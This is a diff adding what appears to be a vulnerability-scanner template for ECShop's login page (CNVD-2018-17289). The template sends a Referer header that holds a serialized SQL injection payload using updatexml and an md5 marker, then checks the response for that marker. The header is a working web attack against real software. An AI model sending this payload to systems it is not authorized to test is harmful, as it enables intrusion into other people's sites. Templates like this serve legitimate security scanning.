@@ -1,0 +1,26 @@
+id: poc-yaml-ecshop-login-sqli
+info:
+  name: ECShop全系列版本远程代码执行漏洞（CNVD-2018-17289）
+  severity: high
+  tags:
+  - rce
+  - CNVD-2018-17289
+  finger: ecshop
+  reference: []
+  description: null
+variables:
+  r1: random_int(10000, 99999)
+transport: http
+requests:
+- method: GET
+  path: /user.php?act=login
+  headers:
+    Content-Type: application/x-www-form-urlencoded
+    Referer: 554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:71:"0,1 procedure
+      analyse(updatexml(1,insert(md5({{.r1}}),1,1,0x7e),1),1)-- -";s:2:"id";i:1;}
+  data: null
+  redirect: false
+  raw: null
+  timeout: null
+  expression: contains(body, substr(md5(r1),1,31))
+  output: []
